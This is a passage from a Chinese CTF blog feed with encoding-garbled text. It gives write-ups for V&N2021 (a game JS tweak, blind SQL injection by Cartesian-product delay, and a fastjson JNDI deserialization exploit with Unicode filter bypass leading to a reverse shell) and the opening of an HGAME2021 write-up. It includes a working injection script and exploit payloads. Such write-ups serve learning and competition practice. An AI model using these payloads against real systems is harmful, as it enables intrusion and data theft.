src="/article/Nepctf2021/20210322133852.png" class="" width="20210322133852" loading="lazy"><hr><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>å¾ˆæœ‰æ”¶è·ï¼Œå°¤å…¶æ˜¯ã€Šç®€å•çš„phpååºåˆ—åŒ–ã€‹ï¼Œåˆå­¦åˆ°ä¸€ä¸ªæ–°å§¿åŠ¿ã€‚</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;é˜Ÿä¼åç§°ï¼šErr0r&lt;/p&gt;</summary>
    
    
    
    <category term="Write-Up" scheme="https://err0r.top/categories/Write-Up/"/>
    
    
    <category term="PHP" scheme="https://err0r.top/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>V&amp;N2021å…¬å¼€èµ›</title>
    <link href="https://err0r.top/article/VN2021ctf/"/>
    <id>https://err0r.top/article/VN2021ctf/</id>
    <published>2021-03-15T04:17:51.000Z</published>
    <updated>2021-03-30T11:45:23.761Z</updated>
    
    <content type="html"><![CDATA[<p>æ¯”èµ›æ˜µç§°ï¼šåˆ«ç­”äº†åˆ«ç­”äº†å†ç­”äººå‚»äº†</p><a id="more"></a><p>æ¯”èµ›æƒ…å†µï¼š</p><img src="/article/VN2021ctf/image-20210315121953685.png" class="" title="image-20210315121953685" loading="lazy"><p>å­©å­å¤ªèœäº†ï¼Œåé¢å®åœ¨ä¸ä¼šåšäº†â€¦</p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Ez-game"><a href="#Ez-game" class="headerlink" title="Ez_game"></a>Ez_game</h3><p>å°æ¸¸æˆé¢˜ä¸Šæ¥å°±æ”¹js</p><img src="/article/VN2021ctf/image-20210315122233099.png" class="" title="image-20210315122233099" loading="lazy"><p>å‘ç°æ¸¸æˆå…³é”®å‡½æ•°ï¼Œç›´æ¥æ”¹æ•°æ®ç„¶å<code>Init()</code>,æœ€å¥½ç–¯ç‹‚<code>NextLevel()</code>è·³åˆ°ç¬¬10å…³</p><img src="/article/VN2021ctf/image-20210315122433276.png" class="" title="image-20210315122433276" loading="lazy"><p>ç›´æ¥ä»ç¬¬åå…³å¼€å§‹ï¼Œä¸Šå»æ’¸bossï¼Œå‡ºflag</p><img src="/article/VN2021ctf/image-20210315122540586.png" class="" title="image-20210315122540586" loading="lazy"><p>ä¹Ÿå¯ä»¥æœ¬åœ°ä¿å­˜ï¼Œç›´æ¥ç®—jsçš„flagï¼Œæˆ–è€…å¼€godæ¨¡å¼.<img src="/article/VN2021ctf/image-20210315122714928.png" class="" title="image-20210315122714928" loading="lazy"></p><p>å†ä¸è¡Œâ€¦åé¢è¿˜å‘ç°äº†ä¸ªå‡½æ•°â€¦<code>boss.Kill()</code></p><hr><h3 id="realezjvav"><a href="#realezjvav" class="headerlink" title="realezjvav"></a>realezjvav</h3><p>hintï¼šæˆ‘çš„ä»£ç ä¸èƒ½æ³¨å…¥å§</p><img src="/article/VN2021ctf/image-20210315122917856.png" class="" title="image-20210315122917856" loading="lazy"><p>æ‰“å¼€ç™»é™†ç•Œé¢ï¼Œç¬¬ä¸€ååº”æ³¨å…¥ï¼Œå†·é™ä¸‹çœ‹æ•°æ®é‡å¾ˆå°‘ï¼Œæ‹¿å‡ºç¥–ä¼ 20wå­—å…¸çˆ†ç ´ã€‚</p><p>å†å†·é™ä¸‹æµ‹è¯•ä¸€ä¸‹ï¼Œç¡®è®¤æ˜¯sqlæ³¨å…¥</p><pre class="language-none"><code class="language-none">username&#x3D;\&amp;password&#x3D;or 1&#x3D;1# Â·ä¸æŠ¥é”™username&#x3D;\&amp;password&#x3D;&#39; Â·æŠ¥é”™username&#x3D;\&amp;password&#x3D;&#39;&#39; Â·ä¸æŠ¥é”™username&#x3D;\&amp;password&#x3D;&#39;# Â·ä¸æŠ¥é”™username&#x3D;\&amp;password&#x3D;&#39;or 1&#x3D;0# Â·ä¸æŠ¥é”™username&#x3D;\&amp;password&#x3D;&#39;or # Â·500æŠ¥é”™username&#x3D;\&amp;password&#x3D;&#39;and if(1,sleep(10),select 1)# Â·ä¸æŠ¥é”™æ— å»¶æ—¶username&#x3D;admin&amp;password&#x3D;&#39;and if(0,sleep(10),select 1)# Â·ä¸æŠ¥é”™æ— å»¶æ—¶å‘ç°æ²¡å•¥ç”¨...</code></pre><p>æ¨æµ‹åç«¯ä¸ºï¼š<code>select * from user where username=&#39;$username&#39; and password=&#39;$password&#39;</code></p><p>è¿‡æ»¤äº†sleep()å¯èƒ½</p><p>è¿™é‡Œæ²¡å›æ˜¾çš„å°±å»¶æ—¶æ³¨å…¥ï¼Œ<code>sleep()</code>,<code>Benchmark()</code>,æˆ–è€…ç¬›å¡å°”ç§¯</p><h4 id="ç¬›å¡å°”ç§¯å»¶æ—¶æ³¨å…¥"><a href="#ç¬›å¡å°”ç§¯å»¶æ—¶æ³¨å…¥" class="headerlink" title="ç¬›å¡å°”ç§¯å»¶æ—¶æ³¨å…¥"></a>ç¬›å¡å°”ç§¯å»¶æ—¶æ³¨å…¥</h4><p>å½“ç„¶å»¶æ—¶ä¸ç²¾ç¡®ï¼Œcount(*)æ•°é‡å¤§æ—¶ï¼Œè´¹æ—¶å°±é«˜ï¼Œä½•å†µæ¯”èµ›æœºå­<strong>æå…¶ä¸ç¨³å®š</strong>ï¼Œä¸æ¸…æ¥šæ˜¯æˆ‘å¡äº†è¿˜æ˜¯æœºå™¨å¡äº†ã€‚</p><blockquote><p>ç¬›å¡å°”ç§¯å»¶æ—¶æ³¨å…¥</p><p>count(*)åé¢æ‰€æœ‰è¡¨ä¸­çš„åˆ—ç¬›å¡å°”ç§¯æ•°ï¼Œæ•°é‡è¶Šå¤šè¶Šå¡ï¼Œå°±ä¼šæœ‰å»¶è¿Ÿï¼Œç±»ä¼¼ä¹‹å‰æŸæ¯”èµ›pgsqlçš„å»¶æ—¶æ³¨å…¥ä¹Ÿå¯ä»¥åˆ©ç”¨æ­¤æ¥æ‰“æ—¶é—´å·®ï¼Œä»è€Œè¾¾åˆ°å»¶æ—¶æ³¨å…¥çš„æ•ˆæœ</p><p>å‚è€ƒä¹‹å‰çš„WPï¼š<a href="/article/cqb2021">æ˜¥ç§‹æ¯2021æ–°æ˜¥æ¬¢ä¹èµ›ä¸€é“é¢˜â€”â€”æŒ‰Fæ³¨å…¥ å¯¹pgsqlçš„ç ”ç©¶</a></p><pre class="language-none"><code class="language-none">mysql&gt; SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C;+-----------+| count(*)  |+-----------+| 113101560 |+-----------+1 row in set (2.07 sec)mysql&gt; select * from ctf_test where user&#x3D;&#39;1&#39; and 1&#x3D;1 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C);+------+-----+| user | pwd |+------+-----+| 1    | 0   |+------+-----+1 row in set (2.08 sec)</code></pre></blockquote><p>ç”šè‡³æ•°é‡å¤§äº†æŠŠæˆ‘æ•°æ®åº“ç»™è·‘å´©äº†â€¦</p><img src="/article/VN2021ctf/image-20210315142653488.png" class="" title="image-20210315142653488" loading="lazy"><p>payloadï¼š</p><pre class="language-none"><code class="language-none">-1&#39;and if(&#96;payload&#96;,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C),0);#</code></pre><p>è„šæœ¬ï¼š</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""-*- coding: utf-8 -*-@File: exp.py@Author: gyy@Time: 3æœˆ 14, 2021"""</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token keyword">import</span> randomurl <span class="token operator">=</span> <span class="token string">"http://&#123;&#125;.c56083ac-9da0-437e-9b51-5db047b150aa.jvav.vnctf2021.node4.buuoj.cn:82/user/login"</span><span class="token comment"># &#123;&#125;ç”±äºå¼€äº†å¤šä¸ªé¶æœºï¼Œæ¯æ¬¡éšæœºè®¿é—®æŸä¸ªé¶æœºï¼Œå¯ä»¥å‡å°‘å†²çªå¯èƒ½</span><span class="token keyword">def</span> <span class="token function">req</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">"/**/"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span>        <span class="token string">"password"</span><span class="token punctuation">:</span> payload    <span class="token punctuation">&#125;</span>    url1 <span class="token operator">=</span> url<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>randrange<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># éšæœºè®¿é—®</span>    <span class="token comment"># print(url1)</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url1<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token comment"># ä¸é™åˆ¶è¶…æ—¶</span>    <span class="token comment"># print(res.text)</span>    <span class="token keyword">if</span> <span class="token string">"504 Gateway Time-out"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span> <span class="token comment"># 504å³ä¸ºæ­£ç¡®</span>        <span class="token keyword">return</span> <span class="token number">1</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token keyword">def</span> <span class="token function">binary_search</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># äºŒåˆ†æ³•~</span>    <span class="token comment"># payload = payload.replace("=",">=")</span>    high <span class="token operator">=</span> <span class="token number">127</span>    low <span class="token operator">=</span> <span class="token number">32</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.05</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>high <span class="token operator">-</span> low<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> mid <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>low<span class="token punctuation">,</span> high <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.05</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> req<span class="token punctuation">(</span>payload <span class="token operator">%</span> mid<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>                    <span class="token keyword">return</span> mid            <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>high <span class="token operator">+</span> low<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>        pd <span class="token operator">=</span> payload <span class="token operator">%</span> mid        <span class="token keyword">if</span> req<span class="token punctuation">(</span>pd<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>            low <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            high <span class="token operator">=</span> mid<span class="token keyword">def</span> <span class="token function">version</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    resultstr <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">"-1'and if((ascii(substr(version(),&#123;&#125;,1))>%d),(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C),0);#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>            i<span class="token punctuation">)</span>        <span class="token comment"># 1'and/**/if(ascii(substr(version(),1,1))>64,1,1)like/**/1#</span>        j <span class="token operator">=</span> binary_search<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        <span class="token keyword">if</span> j <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">:</span>            resultstr <span class="token operator">=</span> resultstr <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>    resultstr <span class="token operator">=</span> <span class="token string">"version==========>"</span> <span class="token operator">+</span> resultstr    <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    resultstr <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">"-1'and if((ascii(substr(database(),&#123;&#125;,1))>%d),(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C),0);#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>            i<span class="token punctuation">)</span>        j <span class="token operator">=</span> binary_search<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        <span class="token keyword">if</span> j <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">:</span>            resultstr <span class="token operator">=</span> resultstr <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>    resultstr <span class="token operator">=</span> <span class="token string">"databases==========>"</span> <span class="token operator">+</span> resultstr    <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span><span class="token comment"># databases==========>ctf</span><span class="token keyword">def</span> <span class="token function">table</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    resultstr <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">"-1'and if((ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('ctf')),&#123;&#125;,1))>%d),(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C),0);#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>            i<span class="token punctuation">)</span>        j <span class="token operator">=</span> binary_search<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        <span class="token keyword">if</span> j <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">:</span>            resultstr <span class="token operator">=</span> resultstr <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>    resultstr <span class="token operator">=</span> <span class="token string">"tables==========>"</span> <span class="token operator">+</span> resultstr    <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span><span class="token comment"># tables==========>ctf</span><span class="token keyword">def</span> <span class="token function">columns</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    resultstr <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">" "</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token comment"># å­©å­æ²¡è·‘äº†ï¼Œå¤ªå¡äº†</span>        j <span class="token operator">=</span> binary_search<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        <span class="token keyword">if</span> j <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">:</span>            resultstr <span class="token operator">=</span> resultstr <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>    resultstr <span class="token operator">=</span> <span class="token string">"columns==========>"</span> <span class="token operator">+</span> resultstr    <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    resultstr <span class="token operator">=</span> <span class="token string">" "</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token comment"># å­©å­æ²¡è·‘äº†ï¼Œå¤ªå¡äº†</span>        j <span class="token operator">=</span> binary_search<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        <span class="token keyword">if</span> j <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">:</span>            resultstr <span class="token operator">=</span> resultstr <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>    resultstr <span class="token operator">=</span> <span class="token string">"data==========>"</span> <span class="token operator">+</span> resultstr    <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token comment"># version()</span>    <span class="token comment"># database()</span>    table<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># columns()</span>    <span class="token comment"># data()</span></code></pre><p>å­©å­å®åœ¨è·‘ä¸ä¸‹å»äº†</p><img src="/article/VN2021ctf/image-20210315125931827.png" class="" title="image-20210315125931827" loading="lazy"><p>pyå‡ºé¢˜äººæ¢äº†å¯†ç <code>no_0ne_kn0w_th1s</code></p><pre class="language-none"><code class="language-none">username&#x3D;admin&amp;password&#x3D;no_0ne_kn0w_th1s</code></pre><p>ç™»å½•æˆåŠŸ</p><img src="/article/VN2021ctf/image-20210315130110417.png" class="" title="image-20210315130110417" loading="lazy"><p>jsåŠ è½½å›¾ç‰‡</p><img src="/article/VN2021ctf/image-20210315135332875.png" class="" title="image-20210315135332875" loading="lazy"><p>å‘ç°<code>/searchimage</code>å¯ä»¥ç›®å½•ç©¿è¶Šï¼Œè¯»ä¸åˆ°flagï¼Œå¯èƒ½åå­—ä¸å¯¹ï¼Œè¯»åˆ°äº†<code>pom.xml</code></p><img src="/article/VN2021ctf/image-20210315135240650.png" class="" title="image-20210315135240650" loading="lazy"><p>æŠ“åŒ…çœ‹</p><img src="/article/VN2021ctf/image-20210315130306763.png" class="" title="image-20210315130306763" loading="lazy"><p>ç»“åˆåº”è¯¥æ˜¯fastjsonååºåˆ—åŒ–æ¼æ´</p><h4 id="fastjson-lt-1-2-68ååºåˆ—åŒ–æ¼æ´"><a href="#fastjson-lt-1-2-68ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="fastjson &lt;1.2.68ååºåˆ—åŒ–æ¼æ´"></a>fastjson &lt;1.2.68ååºåˆ—åŒ–æ¼æ´</h4><p>ç›´æ¥payloadè¯•ä¸€ä¸‹ï¼Œè¢«banäº†</p><img src="/article/VN2021ctf/image-20210315130941235.png" class="" title="image-20210315130941235" loading="lazy"><p>éœ€è¦ç»•è¿‡ï¼ŒJSONObject.parseObject()ä¼šè‡ªåŠ¨ä¼šæŠŠjsonå­—ç¬¦ä¸²ä¸­çš„Unicodeç è¿›è¡Œè½¬æ¢ï¼Œæ‰€ä»¥è½¬æˆUnicodeå³å¯</p><p>æœåŠ¡å™¨èµ· <a href="https://github.com/welk1n/JNDI-Injection-Exploit">JNDI-Injection-Exploit</a></p><p><code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;payload&quot; -A ip</code></p><img src="/article/VN2021ctf/image-20210315140129288.png" class="" title="image-20210315140129288" loading="lazy"><p>å†èµ·ç›‘å¬ç«¯å£</p><p>æœ€åæ‰“payload</p><pre class="language-json" data-language="json"><code class="language-json">roleJson= <span class="token punctuation">&#123;</span><span class="token property">"e"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.lang.Class"</span><span class="token punctuation">,</span><span class="token property">"val"</span><span class="token operator">:</span><span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span><span class="token punctuation">,</span><span class="token property">"dataSourceName"</span><span class="token operator">:</span><span class="token string">"rmi://ip:port/Exploit"</span><span class="token punctuation">,</span><span class="token property">"autoCommit"</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>;<span class="token comment">// éœ€è¦Unicodeç¼–ç </span></code></pre><img src="/article/VN2021ctf/image-20210315140159832.png" class="" title="image-20210315140159832" loading="lazy"><pre class="language-json" data-language="json"><code class="language-json">roleJson= <span class="token punctuation">&#123;</span><span class="token property">"e"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"\u0040\u0074\u0079\u0070\u0065"</span><span class="token operator">:</span><span class="token string">"\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0043\u006c\u0061\u0073\u0073"</span><span class="token punctuation">,</span><span class="token property">"val"</span><span class="token operator">:</span><span class="token string">"\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"\u0040\u0074\u0079\u0070\u0065"</span><span class="token operator">:</span><span class="token string">"\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c"</span><span class="token punctuation">,</span><span class="token property">"dataSourceName"</span><span class="token operator">:</span><span class="token string">"rmi://ip:port/Exploit"</span><span class="token punctuation">,</span><span class="token property">"\u0061\u0075\u0074\u006f\u0043\u006f\u006d\u006d\u0069\u0074"</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>;</code></pre><p>æœåŠ¡å™¨åŠ è½½äº†æ¶æ„classæ–‡ä»¶ï¼ŒæˆåŠŸgetshell</p><img src="/article/VN2021ctf/image-20210315140505582.png" class="" title="image-20210315140505582" loading="lazy"><p>ç¼–ç é—®é¢˜ï¼Œæ•´äº†ä¸€ä¸ªå°æ—¶å°±æ˜¯åå¼¹ä¸äº†shellï¼ŒåŸæ¥æ˜¯javaåå¼¹shellçš„ç¼–ç é—®é¢˜ï¼Œå»<a href="http://www.jackson-t.ca/runtime-exec-payloads.html">ç½‘ç«™</a>ç¼–ç ä¸€ä¸‹å°±æˆåŠŸäº†</p><hr><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>å­©å­å¥½èœï¼Œè¢«ã€Šç®€å•çš„ç­¾åˆ°ã€‹æå‚»äº†ã€‚æŸ¥é˜…äº†ä¸å°‘èµ„æ–™ï¼Œæ‹œè¯»äº†å¾ˆå¤šå¤§ä½¬çš„åšå®¢ï¼Œè™½ç„¶æœ€åè¿˜æ˜¯æ²¡åšå‡ºæ¥ï¼Œç­‰ç­‰WPåº·åº·å¤§ä½¬çš„æ€è·¯ä¹Ÿè®¸æ¯”è‡ªå·±å¿™æ´»åŠå¤©æœ‰ç”¨ï¼Œå½“ç„¶å°‘ä¸äº†åŸç†çš„ç ”ç©¶ã€‚</p><p>ç»§ç»­å­¦ä¹ å•¦</p><p>ï¼ˆæƒ³ç»“è¯†æ›´å¤šå¤§ä½¬ï¼‰</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;æ¯”èµ›æ˜µç§°ï¼šåˆ«ç­”äº†åˆ«ç­”äº†å†ç­”äººå‚»äº†&lt;/p&gt;</summary>
    
    
    
    <category term="Write-Up" scheme="https://err0r.top/categories/Write-Up/"/>
    
    
    <category term="SQL" scheme="https://err0r.top/tags/SQL/"/>
    
    <category term="JAVA" scheme="https://err0r.top/tags/JAVA/"/>
    
  </entry>
  
  <entry>
    <title>HGAME2021</title>
    <link href="https://err0r.top/article/hgame2021/"/>
    <id>https://err0r.top/article/hgame2021/</id>
    <published>2021-02-06T05:59:51.000Z</published>
    <updated>2021-03-30T11:58:02.290Z</updated>
    
    <content type="html"><![CDATA[<p>HAME2021-week ä¸ªäººWP</p><p>æ˜µç§°ï¼šErr0r</p><a id="more"></a><h1 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h1><p>è¿™æ˜¯week1ï¼Œåšäº†Webå’Œéƒ¨åˆ†Miscï¼Œåç»­ä¼šæ•´åˆæˆä¸€ç¯‡æ–‡ç« (å…ˆè®©æˆ‘æ°´ç€)</p><img src="/article/hgame2021/image-20210206151019347.png" class="" title="image-20210206151019347" loading="lazy"><p><strong>ç”±äºæŸäº›åŸå› ï¼Œä»¥åä¼šæ³¨é‡åŸç†ä¸Šçš„ç ”ç©¶</strong></p><hr><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Hitchhiking-in-the-Galaxy"><a href="#Hitchhiking-in-the-Galaxy" class="headerlink" title="Hitchhiking_in_the_Galaxy"></a>Hitchhiking_in_the_Galaxy</h3><p>é¢˜ç›®æè¿°ï¼š ç¬¬ä¸€æ¬¡åœ¨é“¶æ²³ç³»é‡Œæ­é¡ºé£è½¦ï¼Œè¦å‡†å¤‡å•¥ï¼Œåœ¨çº¿ç­‰ï¼ŒæŒºæ€¥çš„ </p><p>é¢˜ç›®åœ°å€ï¼š <a href="http://hitchhiker42.0727.site:42420/">http://hitchhiker42.0727.site:42420</a> </p><img src="/article/hgame2021/image-20210206151406243.png" class="" title="image-20210206151406243" loading="lazy"><p>æŠ“åŒ…çœ‹çœ‹é¡ºé£è½¦å•¥æ ·</p><img src="/article/hgame2021/image-20210206151614330.png" class="" title="image-20210206151614330" loading="lazy"><p>çŠ¶æ€ç 405Method Not Allowed</p><p>å¯¹äºä»»ä½•å®¢æˆ·ç«¯è¯·æ±‚éƒ½è¦è¿›è¡Œä¸€å¥—æµç¨‹ï¼Œå³DNSè§£æåŸŸåè¿”å›IPï¼Œæ‰“å¼€IPå¥—æ¥å­—(socket)è¿æ¥IPï¼Œå†é€šè¿‡å¥—æ¥å­—å†™HTTPæ•°æ®æµï¼Œæœ€åä»WEBæœåŠ¡å™¨æ¥å—å“åº”çš„HTTPæ•°æ®æµã€‚è€Œ405çŠ¶æ€ç å°±æ˜¯æœ€åä¸€æ­¥ç”Ÿæˆçš„ï¼Œå³æœåŠ¡å™¨ä¸å“åº”è¿™ç§è¯·æ±‚æ–¹å¼ï¼Œè¯·æ±‚æ–¹å¼æœ‰GET/POST/HEAD/PUTç­‰ï¼Œæ¢æˆPOSTçœ‹çœ‹ã€‚</p><blockquote><p>æ³¨æ„:åœ¨burpsuiteé‡Œé¢ï¼Œå³é”®æ”¹å˜è¯·æ±‚æ–¹å¼å³å¯</p><img src="/article/hgame2021/image-20210206152237254.png" class="" title="change" loading="lazy"></blockquote><p>éšåæç¤º<code>åªæœ‰ä½¿ç”¨&quot;æ— é™éæ¦‚ç‡å¼•æ“&quot;(Infinite Improbability Drive)æ‰èƒ½è®¿é—®è¿™é‡Œï½</code></p><img src="/article/hgame2021/image-20210206152332459.png" class="" title="image-20210206152332459" 